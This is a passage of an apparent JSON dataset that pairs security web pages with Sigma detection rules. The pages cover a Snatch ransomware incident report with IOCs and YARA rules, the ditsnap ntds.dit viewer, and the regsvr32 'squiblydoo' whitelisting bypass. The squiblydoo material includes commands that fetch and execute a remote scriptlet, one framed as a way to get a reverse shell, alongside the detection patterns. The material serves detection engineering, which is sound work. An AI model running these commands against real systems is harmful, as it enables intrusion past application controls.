subsequently compromised. Arrows represent the direction of movement, highlighting how the ransomware spreads through the network.\nTranscription: |\n  Snatch Access and Lateral Movement\n  \n  - Internet\n    - Various C2 Channels\n      - Snatch Entry RDP\n        - RDP exposed host\n          - Pivot 1 RDP\n            - Domain Controller\n          - Pivot 2 RDP\n            - Backup Server\n              - 1st host ransomed\n          - Pivot N+1 ransom\n          - Other Hosts\n            - Host\n            - Host\n            - Host\n            - Host\n```\n\nOn all machines we are left with the following:\n\n```image\nAlt: Ransom Note\nDescription: The image displays a ransom note in a Notepad window. The note informs the victim that all their files are encrypted and provides contact information for the attackers, urging the victim to reach out to recover their files. It specifies that the header of the message must include the file extension of the encrypted files and warns not to rename or edit them to avoid permanent data loss. The attackers also offer to decrypt three files for free as proof of their capabilities, highlighting a sense of urgency with a 48-hour deadline for response.\nTranscription: |\n  HOW TO RESTORE YOUR FILES - Notepad\n  \n  Hello! All your files are encrypted and only we can decrypt them.\n  \n  Contact us:\n  @protonmail.com or @cock.li\n  \n  Write us if you want to return your files - we can do it very quickly!\n  \n  The header of letter must contain extension of encrypted files.\n  We always reply within 24 hours. If not - check spam folder, resend your letter or try send letter from another email service (like protonmail.com).\n  \n  Attention!\n  Do not rename or edit encrypted files; you may have permanent data loss.\n  \n  To prove that we can recover your files, we are ready to decrypt any three files (less than 1Mb) for free (except databases, Excel and backups).\n  \n  HURRY UP!\n  If you do not email us in the next 48 hours then your data may be lost permanently.\n```\n\nSnatch Team requested 40k USD for the decryptor but with negotiations we were able to talk them down to less than 15k.\n\n## Recovery:\n\nLet’s take a minute to think about what recovery would look like in a large organization. Every server and online machine was rebooted into safe mode without networking which causes you to lose complete visibility. This gets very painful quickly.\n\n## Conclusion:\n\nAs we’ve seen time and time again, RDP is being brute forced to gain access into the network and then the threat actor moves laterally quickly to install ransomware. Although we were surprised that the threat actors manually RDPed into each system rather than using GPO or PsExec. Even though this attacker did not seem highly skilled they were productive, efficient and in less than 5 hours could have earned 40k (8k per hour).\n\n## Analysis of Safe.exe:\n\n`Safe.exe` is a Go based executable, it drops 4 bat files that kick off the ransom process. It creates a new service to run `safe.exe` and then sets the system to reboot into safe mode on next boot and then executes a shutdown of the system ASAP. When the system comes back up its in Safe Mode without networking.\n\n```image\nAlt: Safe.exe Analysis\nDescription: The image is a detailed analysis of the `Safe.exe` ransomware executable, showcasing its activities and behavior within a system. It depicts a structured tree view of processes and commands executed by `Safe.exe`, including associated batch files and registry modifications. The image reveals various command line executions, service registrations, and system configurations that enable the ransomware to initiate its operations, such as rebooting the system into Safe Mode and shutting it down. Each command is accompanied by its process ID (PID), illustrating the interconnected actions taken by this malicious software.\nTranscription: |\n  safe.exe (PID: 4008)  ?  2177\n  ├── cmd.exe (C:\\wmmljysacrpv.bat) (PID: 864)\n  │   ├── reg.exe REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\" /v SystemStartOptions (PID: 4056)\n  │   ├── cmd.exe (C:\\vlqyrdwn.bat) (PID: 3264)\n  │   └── cmd.exe (C:\\neohdgrouplwm.bat) (PID: 3952)\n  │       ├── reg.exe REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SafeBoot\\Minimal\\Safe\" /ve /t REG_SZ /f /D Service (PID: 3124)\n  │       ├── reg.exe REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SafeBoot\\Minimal\\System\" /ve /t REG_SZ /f /D Service (PID: 3120)\n  │       ├── bcdedit.exe /set {current} safeboot minimal (PID: 4060)\n  │       ├── cmd.exe (C:\\lxrqct.bat) (PID: 3116)\n  │       ├── cmd.exe (C:\\lawgscylwq.bat) (PID: 1316)\n  │       ├── shutdown.exe /r /f /t 0 (PID: 4000)\n  │       ├── shutdown.exe /r /f /t 3912 (PID: 2396)\n  │       └── bcdedit.exe (PID: 2096)\n```\n\nHybrid Analysis of Safe.exe\n\n### IOCs:\n\nAll IOCs in MISPPRiv EID 68226 or UUID 5ee65855-3320-456d-b704-4878950d210f\n\n**C2:**\n```\n91.229.77.161\n```\n\n**RDP Access IPs:**\n```\n193.70.12.240\n178.162.209.135\n```\n\n**Hashes:**\n```\nsafe.exe|2bbff2111232d73a93cd435300d0a07e\n2bbff2111232d73a93cd435300d0a07e\nb93d633d379052f0a15b0f9c7094829461a86dbb\n3160b4308dd9434ebb99e5747ec90d63722a640d329384b1ed536b59352dace6\n```\n\nVirusTotal Analysis of Safe.exe\n\n```\nx3.exe|1422dae0330c713935d50773680fcb39\n1422dae0330c713935d50773680fcb39\nd5a0c796032eda2fe20d1f39bae3fbc4e6407e8c\nb9e4299239880961a88875e1265db0ec62a8c4ad6baf7a5de6f02ff4c31fcdb1\n```\n\nVirusTotal Analysis of x3.exe\n\n```\ncplXen.exe|c9a728aa3f5b6f48b68df4bb66b41a5c\n90035ab418033b39d584c7bc609cab1664460069\nc305b75a4333c7fca9d1d71b660530cc98197b171856bf433e4e8f3af0424b11\n```\n\nVirusTotal Analysis of cplXen.exe\n\n```\n116EBE27202905AFFB94F5C1597D511ABCB5B381411431956A03E47B388582BF.bat|1f7b17cacb0263b84cf3e9d4a5429ef9\n1f7b17cacb0263b84cf3e9d4a5429ef9\n14b2948a28d16c05fa7237dd8823592a735ef43f\n116ebe27202905affb94f5c1597d511abcb5b381411431956a03e47b388582bf\n```\n\n### YARA:\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2020-06-17\n   Identifier: snatch-ransomware\n   Reference: https://thedfirreport.com/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule snatch_ransomware_x3_loader {\n   meta:\n      description = \"snatch-ransomware - file x3.exe\"\n      author = \"DFIR Report\"\n      reference = \"https://thedfirreport.com/\"\n      date = \"2020-06-17\"\n      hash1 = \"b9e4299239880961a88875e1265db0ec62a8c4ad6baf7a5de6f02ff4c31fcdb1\"\n   strings:\n      $s1 = \"jd4ob7162ns.dll\" fullword wide\n      $s2 = \"kb05987631s.dll\" fullword wide\n      $s3 = \"fw0a53482aa.dll\" fullword wide\n      $s4 = \"C:\\\\Builds\\\\TP\\\\rtl\\\\common\\\\TypInfo.pas\" fullword wide\n      $s5 = \"C:\\\\Builds\\\\TP\\\\rtl\\\\sys\\\\SysUtils.pas\" fullword wide\n      $s6 = \"C:\\\\Builds\\\\TP\\\\rtl\\\\common\\\\Classes.pas\" fullword wide\n      $s7 = \"/K schtasks /Create /RU SYSTEM /SC DAILY /ST 00:00 /TN \\\"Regular Idle Maintenance\\\" /TR \\\"\" fullword wide\n      $s8 = \"/K schtasks /Create /RU SYSTEM /SC ONSTART /TN \\\"Regular Idle Maintenances\\\" /TR \\\"\" fullword wide\n      $s9 = \"RootP0C\" fullword ascii\n      $s10 = \"Component already destroyed: \" fullword wide\n      $s11 = \"Stream write error The specified file was not found2Length of Strings and Objects arrays must be equal#''%s'' is not a valid int\" wide\n      $s12 = \"PPackageTypeInfo$\\\"@\" fullword ascii\n      $s13 = \"PositionP0C\" fullword ascii\n      $s14 = \"DesignInfoP0C\" fullword ascii\n      $s15 = \"OwnerP0C\" fullword ascii\n      $s16 = \"3\\\"4\\\\4~4\" fullword ascii /* hex encoded string '4D' */\n      $s17 = \"TComponentClassP0C\" fullword ascii\n      $s18 = \":$:2:6:L:\\\\:l:t:x:|:\" fullword ascii\n      $s19 = \":P:T:X:\\\\:t:\" fullword ascii\n      $s20 = \":,:<:@:L:T:X:\\\\:`:d:h:l:p:t:x:|:\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 900KB and\n      ( pe.imphash() == \"d6136298ea7484a715d40720221233be\" or 8 of them )\n}\n\nrule snatch_ransomware_safe_go_ransomware {\n   meta:\n      description = \"snatch-ransomware - file safe.exe\"\n      author = \"DFIR Report\"\n      reference = \"https://thedfirreport.com/\"\n      date = \"2020-06-17\"\n      hash1 = \"3160b4308dd9434ebb99e5747ec90d63722a640d329384b1ed536b59352dace6\"\n   strings:\n      $s1 = \"dumpcb\" fullword ascii\n      $s2 = \"dfmaftpgc\" fullword ascii\n      $s3 = \"ngtrunw\" fullword ascii\n      $s4 = \"_dumpV\" fullword ascii\n      $s5 = \".dll3u^\" fullword ascii\n      $s6 = \"D0s[Host#\\\"0\" fullword ascii\n      $s7 = \"CPUIRC32D,OPg\" fullword ascii\n      $s8 = \"WSAGetOv\" fullword ascii\n      $s9 = \"Head9iuA\" fullword ascii\n      $s10 = \"SpyL]ZIo\" fullword ascii\n      $s11 = \"cmpbody\" fullword ascii\n      $s12 = \"necwnamep\" fullword ascii\n      $s13 = \"ZonK+ pW\" fullword ascii\n      $s14 = \"printabl\" fullword ascii\n      $s15 = \"atomicn\" fullword ascii\n      $s16 = \"powrprof\" fullword ascii\n      $s17 = \"recdvoc\" fullword ascii\n      $s18 = \"nopqrsx\" fullword ascii\n      $s19 = \"ghijklm\" fullword ascii\n      $s20 = \"spdelta\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 8000KB and\n      ( pe.imphash() == \"6ed4f5f04d62b18d96b26d6db7c18840\" or 8 of them )\n}\n\nrule snatch_ransomware_cplXen {\n   meta:\n      description = \"snatch-ransomware - file cplXen.exe\"\n      author = \"DFIR Report\"\n      reference = \"https://thedfirreport.com/\"\n      date = \"2020-06-17\"\n      hash1 = \"c305b75a4333c7fca9d1d71b660530cc98197b171856bf433e4e8f3af0424b11\"\n   strings:\n      $x1 = \"C:\\\\Users\\\\Administrator\\\\source\\\\repos\\\\tmt\\\\Release\\\\TMT.pdb\" fullword ascii\n      $s2 = \"curity>&lt;requestedPrivileges>&lt;requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"&gt;&lt;/requestedExecutionLevel&gt;&lt;/requeste\" ascii\n      $s3 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n      $s4 = \"hemas.microsoft.com/SMI/2005/WindowsSettings\\\"&gt;true&lt;/dpiAware&gt;&lt;/windowsSettings&gt;&lt;/application&gt;&lt;/assembly&gt;\" fullword ascii\n      $s5 = \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\" fullword wide\n      $s6 = \"operator&lt;=&gt;\" fullword ascii\n      $s7 = \"operator co_await\" fullword ascii\n      $s8 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n      $s9 = \"91.229.77.71\" fullword wide\n      $s10 = \"&lt;assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"&gt;&lt;trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n      $s11 = \"vileges&gt;&lt;/security&gt;&lt;/trustInfo&gt;&lt;application xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\"&gt;&lt;windowsSettings&gt;&lt;dpiAware xmlns=\\\"http:/\" ascii\n      $s12 = \"Aapi-ms-win-core-datetime-l1-1-1\" fullword wide\n      $s13 = \"Aapi-ms-win-core-fibers-l1-1-1\" fullword wide\n      $s14 = \"api-ms-win-core-file-l1-2-2\" fullword wide /* Goodware String - occured 1 times */\n      $s15 = \"__swift_2\" fullword ascii\n      $s16 = \"__swift_1\" fullword ascii\n      $s17 = \"&gt;6?V?f?\" fullword ascii /* Goodware String - occured 1 times */\n      $s18 = \"7K7P7T7X7\\\\7\" fullword ascii /* Goodware String - occured 1 times */\n      $s19 = \"Wininet.dll\" fullword ascii /* Goodware String - occured 1 times */\n      $s20 = \"QQSVj8j@\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 300KB and\n      ( pe.imphash() == \"ec348684b8d3fbd21669529c6e5cef8b\" or ( 1 of ($x*) or 4 of them ) )\n}\n```",
    "sigma_rule": {
      "title": "PUA - DIT Snapshot Viewer",
      "id": "d3b70aad-097e-409c-9df2-450f80dc476b",
      "status": "test",
      "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
      "references": [
        "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
        "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap"
      ],
      "author": "Furkan Caliskan (@caliskanfurkan_)",
      "date": "2020-07-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\ditsnap.exe"
          },
          {
            "CommandLine|contains": "ditsnap.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin usage"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_ditsnap.yml",
    "id": "388"
  },
  {
    "url": "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap",
    "markdown": "# ditsnap\n\n## Folders and Files\n\n- EseDataAccess\n- VssCopy\n- ditsnap_exe\n- images\n- .gitignore\n- LISENCE.md\n- README.md\n- ditsnap.sln\n\n## README\n\n### DIT Snapshot Viewer\n\nDIT Snapshot Viewer is an inspection tool for Active Directory database, `ntds.dit`. This tool connects to ESE (Extensible Storage Engine) and reads tables/records including hidden objects by low level C API.\n\nThe tool can extract `ntds.dit` file without stopping `lsass.exe`. When Active Directory Service is running, `lsass.exe` locks the file and does not allow access to it. The snapshot wizard copies `ntds.dit` using VSS (Volume Shadow Copy Service) even if the file is exclusively locked. As copying `ntds.dit` may cause data inconsistency in ESE DB, the wizard automatically runs **esentutil /repair** command to fix the inconsistency.\n\nThe executable is available here: Download ditsnap.exe\n\n#### Screenshots\n\n##### Main Window\n\n```image\nAlt: Main Window\nDescription: The image depicts a screenshot of the DIT Snapshot Viewer application interface. It shows a data table with various columns such as 'DNT_col', 'PDNT_col', 'cnt_col', 'OBJ_col', and additional attributes related to directory objects. The left pane lists different tables and users, including 'Administrator' and 'Guest', along with their corresponding entries in the main data grid. The layout suggests that this is used for analyzing directory information and related objects.\nTranscription: |\n  DIT Snapshot Viewer\n  \n  C:\\Users\\user1\\vm\\New folder\\ntds.\n    datatable\n    hiddentable\n    link_history_table\n    link_table\n    MSysDefrag2\n    MSysLocales\n    MSysObjects\n    MSysObjectsShadow\n    MSysObjids\n    quota_rebuild_progress_table\n    quota_table\n    sdprocounttable\n    sdproptable\n    sd_table\n  \n  ATTm589825 <ATT_RDN>    DNT_col  PDNT_col  cnt_col  OBJ_col  RDNtyp...  NCDNT_...  ATTb59060\n  PSPs                     3906     2017     1        1793     3         2007       1693\n  TPM Devices              3914     2007     1        3841     3         2007       1962\n  Administrator            3917     2014     6        1793     3         2007       1528\n  Guest                    3918     2014     2        3585     3         2007       1528\n  WinRMRemoteWMIUsers__    3919     2014     1        1793     3         2007       1584\n  Builtin                  3920     2007     28       1793     3         2007       1509\n  Administrators           3921     3920     1        1        3         2007       1584\n  Users                    3922     3920     1        1        3         2007       1584\n  S-1-5-4                  3923     2021     2        1        3         2007       1578\n  S-1-5-11                 3924     2021     1        1793     3         2007       1584\n  Guests                   3925     3920     1        1        3         2007       1584\n  Print Operators          3926     3920     1        1        3         2007       1584\n  Backup Operators         3927     3920     1        3841     3         2007       1584\n  Replicator               3928     3920     1        1        3         2007       1584\n  Remote Desktop Users     3929     3920     1        1        3         2007       1584\n  Network Configuration Operators 3930 3920 1        1        3         2007       1584\n  Performance Monitor Users 3931   3920     1        1        3         2007       1584\n  Performance Log Users    3932     3920     1        1537     3         2007       1584\n  Distributed COM Users    3933     3920     1        1793     3         2007       1584\n  \n  Ready\n```\n\n##### Detail Dialog\n\n```image\nAlt: Detail Dialog\nDescription: The image is a screenshot of a detail dialog from a software tool, displaying various attributes related to user accounts in a directory service or database. It includes a list of attributes such as 'OBJECT_CATEGORY', 'USER_ACCOUNT_CONTROL', and 'SAM_ACCOUNT_TYPE', along with their corresponding values and types. The right side shows interpreted values for some fields, indicating their meanings (e.g., 'Person', 'User', 'Normal Account'). The interface appears to be designed for administrators to review specific user-related data.\nTranscription: |\n  Administrator\n  \n  [ ] Show only rows that have values\n  \n  Name            Description                  Type        Value                                       Interpreted Value\n  ATTb590606      OBJECT_CATEGORY              Long        1128                                        Person\n  ATTc0           OBJECT_CLASS                 Long        655369; 65543; 65542; 65536                 User; Organizational-Person; Person; Top\n  ATTl590692      IS_CRITICAL_SYSTEM_OBJECT    Long        1\n  ATTj131073      INSTANCE_TYPE                Long        4\n  ATTj589832      USER_ACCOUNT_CONTROL         Long        66048                                       DONT_EXPIRE_PASSWD|NORMAL_ACCOUNT\n  ATTj589836      BAD_PWD_COUNT                Long        0\n  ATTj589840      CODE_PAGE                    Long        0\n  ATTj589849      COUNTRY_CODE                 Long        0\n  ATTj589922      PRIMARY_GROUP_ID             Long        513\n  ATTj589993      LOGON_COUNT                  Long        4\n  ATTj590126      SAM_ACCOUNT_TYPE             Long        805306368                                    ALIAS_OBJECT|DOMAIN_OBJECT|GROUP_OBJECT|NORMAL_OBJECT|{C4928DBA-7D77-A441-A314-6A6A3A5FF66D}\n  ATTk589826      OBJECT_GUID                  LongBinary  C4 92 8D BA 7D 77 A4 41 A3 14 6A 6A 3A 5F F6 6D\n  ATTk589827      REPL_PROPERTY_META_DATA      LongBinary  01 00 00 00 00 00 00 00 1F 00 ...\n  ATTk589879      DBCS_PWD                     LongBinary  11 00 00 00 00 00 00 00 00 00 5E...\n  ATTk589914      UNICODE_PWD                  LongBinary  11 00 00 00 00 00 00 00 2C 69 ...\n  ATTl131074      WHEN_CREATED                 Currency    13112612035                                  2016-07-10 08:13:55.000\n  ATTl131075      WHEN_CHANGED                 Currency    13112612035                                  2016-07-10 08:13:55.000\n```\n\n#### Interpreted Value\n\nInterpreted Value column in Detail Dialog shows human-readable representations of raw ESE column values. Here are the examples:\n\n##### OBJECT_CATEGORY\n\nThe attribute is stored as a 32-bit integer in ESE, which points to DNT (Distinguished Name Tag) of another Active Directory object. Interpreted Value for the attribute shows RDN (Relative Distinguished Name) of the object.\n\n##### OBJECT_CLASS\n\nThe attribute is stored as a multi-valued 32-bit integer column in ESE, which points to GOVERNS_ID of other objects. Interpreted Value for the attribute shows RDNs of the objects.\n\n##### PWD_LAST_SET, LAST_LOGON, LAST_LOGOFF, ACCOUNT_EXPIRES\n\nThose attributes are stored as 64-bit integers in ESE, which are treated as FILETIME.aspx) in Active Directory. Interpreted Value column for the attributes shows it as a date format.\n\n##### WHEN_CREATED, WHEN_CHANGED\n\nThose attributes are stored as 64-bit integers in ESE, which are treated as shortened FILETIME.aspx) (1/10000000 of the integer representation of FILETIME.aspx)). Interpreted Value for those attributes shows it as a date format.\n\n##### USER_ACCOUNT_CONTROL\n\nThe attribute is stored as a 32-bit integer in ESE, which are treated as flags that control the behavior of the user account. Interpreted Value for the attribute shows the list of flags. See https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx.aspx).\n\n### EseDataAccess static library\n\nEseDataAccess static library can be used for other ESE inspection applications. `EseDataAccess.h` contains C++ object-oriented representation of ESE C API. For example, ESE table is represented by `EseTable` class defined as below.\n\n```\nclass EseTable\n{\n    public:\n        EseTable(const EseDatabase* const eseDatabase, string tableName);\n        ~EseTable();\n        void MoveFirstRecord() const;\n        bool MoveNextRecord() const;\n        void Move(uint rowIndex) const;\n        int CountColumnValue(uint columnIndex) const;\n        wstring RetrieveColumnDataAsString(uint columnIndex, uint itagSequence = 1);\n        uint GetColumnCount() const;\n        wstring GetColumnName(uint columnIndex) const;\n};\n```",
    "sigma_rule": {
      "title": "PUA - DIT Snapshot Viewer",
      "id": "d3b70aad-097e-409c-9df2-450f80dc476b",
      "status": "test",
      "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
      "references": [
        "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
        "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap"
      ],
      "author": "Furkan Caliskan (@caliskanfurkan_)",
      "date": "2020-07-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\ditsnap.exe"
          },
          {
            "CommandLine|contains": "ditsnap.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin usage"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_ditsnap.yml",
    "id": "389"
  },
  {
    "url": "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious Usage Of Qemu",
      "id": "5fc297ae-25b6-488a-8f25-cc12ac29b744",
      "status": "test",
      "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
      "references": [
        "https://securelist.com/network-tunneling-with-qemu/111803/",
        "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5"
      ],
      "author": "Muhammad Faisal (@faisalusuf), Hunter Juhan (@threatHNTR)",
      "date": "2024-06-03",
      "tags": [
        "attack.command-and-control",
        "attack.t1090",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "-m 1M",
            "-m 2M",
            "-m 3M"
          ],
          "CommandLine|contains|all": [
            "restrict=off",
            "-netdev ",
            "connect=",
            "-nographic"
          ]
        },
        "filter_main_normal_usecase": {
          "CommandLine|contains": [
            " -cdrom ",
            " type=virt ",
            " -blockdev "
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_qemu_suspicious_execution.yml",
    "id": "393"
  },
  {
    "url": "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo",
    "markdown": "# regsvr32\n\nregsvr32 (squiblydoo) code execution - bypass application whitelisting.\n\n## Execution\n\n```\n<?XML version=\"1.0\"?>\n<scriptlet>\n  <registration\n    progid=\"TESTING\"\n    classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" >\n  <script language=\"JScript\">\n    <![CDATA[\n      var foo = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");\n    ]]>\n  </script>\n  </registration>\n</scriptlet>\n```\n\nWe need to host the back.sct on a web server so we can invoke it like so:\n\n```\nregsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll\n```\n\n## Observations\n\n```image\nAlt: calc.exe spawned by regsvr32.exe\nDescription: The image displays a screenshot of a process list from a system monitoring tool. It highlights the process 'regsvr32.exe' in red, indicating its execution at a specific time (11:26:04 PM on 7/12/2018). The list shows various processes running on the machine, including 'calc.exe' and 'powershell.exe', along with their memory usage and CPU time. This visualization is important for identifying potential malicious activity associated with the invocation of 'regsvr32.exe'.\nTranscription: |\n  GoogleCrashHandler64.exe          8:19:13 PM 7/9/2018        1,644 K      1,440 K      2860 Google Crash Handler\n  explorer.exe                     10:17:53 PM 7/9/2018       49,460 K     15,640 K      1548 Windows Explorer\n    VBoxTray.exe                   10:17:56 PM 7/9/2018        2,648 K      7,216 K      1992 VirtualBox Guest Additions Tray\n    chrome.exe                     10:17:59 PM 7/9/2018       56,380 K     14,464 K      1336 Google Chrome\n    powershell.exe                 11:44:24 PM 7/9/2018       37,796 K     10,488 K      3324 Windows PowerShell\n      regsvr32.exe                 11:26:04 PM 7/12/2018        8,312 K     11,264 K      2432 Microsoft(C) Register Server\n        calc.exe                   11:26:04 PM 7/12/2018        5,404 K     10,764 K      3792 Windows Calculator\n  Code.exe                         11:05:44 PM 7/10/2018       41,256 K     12,964 K      3468 Visual Studio Code\n    procexp64.exe                  11:05:30 PM 7/11/2018       18,492 K     29,564 K      3964 Sysinternals Process Explorer\n    Tcpview.exe                    11:05:31 PM 7/11/2018        7,284 K      1,932 K      3290 TCP/UDP Endpoint Viewer\n  regedit.exe                      10:46:51 PM 7/11/2018        4,128 K      6,908 K      3232 Registry Editor\n  PDFStreamDumper.exe              11:17:33 PM 7/12/2018       11,108 K     14,861 K      2628 \n  MpCmdRun.exe                     11:24:25 PM 7/12/2018        3,844 K      7,536 K       772 Microsoft Malware Protection Command Line Utility\n  calc.exe                         11:25:27 PM 7/12/2018        5,468 K     10,852 K      3056 Windows Calculator\n```\n\nNote how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immediately evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:\n\n```image\nAlt: regsvr32 commandline\nDescription: The image is a technical screenshot displaying event data related to the execution of 'calc.exe' (Windows Calculator) spawned by 'regsvr32.exe'. It lists details such as the command line used, company name, current directory, description, file version, hashes, integrity level, logon GUID, logon ID, and the parent command line that triggered the execution. This information is relevant for analyzing potential malicious behavior involving regsvr32 and is useful for threat detection and incident response.\nTranscription: |\n  event_data.CommandLine: \"C:\\Windows\\System32\\calc.exe\"\n  event_data.Company: Microsoft Corporation\n  event_data.CurrentDirectory: C:\\Users\\mantvydas\\\n  event_data.Description: Windows Calculator\n  event_data.FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n  event_data.Hashes: MD5=10E4A1D2132CCB5C6759F083CDB6F3C9,SHA256=C6A91CBA00BF87CDB064C49ADAAC82255C0A7E7F2B1B0B8A8B2F1D2F1D2F1D2F\n  event_data.Image: C:\\Windows\\System32\\calc.exe\n  event_data.IntegrityLevel: High\n  event_data.LogonGuid: {9DC8C1F-DOFC-5B43-0000-00209C511300}\n  event_data.LogonId: 0x13519c\n  event_data.ParentCommandLine: \"C:\\Windows\\system32\\regsvr32.exe\" /s /i:http://10.0.0.5/back.sct scrobj.dll\n```\n\nAdditionally, of course sysmon will show regsvr32 establishing a network connection:\n\n```image\nAlt: regsvr32 network\nDescription: The image displays a detailed log entry related to a network connection detected by the Sysmon tool. It includes timestamps, process IDs, source and destination IP addresses, ports, and additional metadata about the network activity initiated by the regsvr32.exe process. This information is crucial for analyzing and monitoring suspicious activities on the network.\nTranscription: |\n  Network connection detected:\n  UtcTime: 2018-07-10 08:35:15.935\n  ProcessGuid: {9DC8CF1F-D57C-5B47-0000-00105172FA00}\n  ProcessId: 2432\n  Image: C:\\Windows\\System32\\regsvr32.exe\n  User: mantvydas-PC\\mantvydas\n  Protocol: tcp\n  Initiated: true\n  SourceIsIpv6: false\n  SourceIp: 10.0.0.2\n  SourceHostname: mantvydas-PC\n  SourcePort: 49981\n  SourcePortName:\n  DestinationIsIpv6: false\n  DestinationIp: 10.0.0.5\n  DestinationHostname:\n  DestinationPort: 80\n  DestinationPortName: http\n```\n\n## References\n\nSigned Binary Proxy Execution: Regsvr32, Sub-technique T1218.010 - Enterprise | MITRE ATT&CK®",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of Regsvr32",
      "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-april-2022/",
        "https://www.echotrail.io/insights/search/regsvr32.exe",
        "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo"
      ],
      "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-05-05",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\regsvr32.exe",
          "Image|endswith": [
            "\\calc.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\werfault.exe",
          "CommandLine|contains": " -u -p "
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely, but can rarely occur. Apply additional filters accordingly."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_child_process.yml",
    "id": "405"
  },
  {
    "url": "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
    "markdown": "# Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)\n\n**Wednesday, April 26, 2017**\n\nSo, I have been working this out the last few days. I was trying to solve a particular problem.\n\nI needed a reverse shell on a workstation locked down by AppLocker executable and script rules enforced.\n\n**tl;dr**\n`regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll`\n\nI have been researching fileless persistence mechanisms. And it led me to a dark place. I would wish on no mortal. COM+.\n\nI posted earlier about .sct files. This link describes what they are. In short, they are XML documents that allow you to register COM objects that are backed not by a .dll but scripts.\nInside COM+\n\nHowever, I wasn't really happy with what I had found since it required Admin rights in order to execute. I could register the script to bypass AppLocker, but I still had to instantiate the object to trigger the code execution.\n\nThen, I decided to place the script block inside of the Registration tag. Bam! Now all I had to do was call the regsvr32 and the code would execute. Still... That whole admin problem...\n\nAfter pouring over hellish COM+ forums from 1999, I found a reference that stated that the code in the registration element executes on register and unregister.\n\nI logged in as a normal user and right-clicked the .sct file and chose 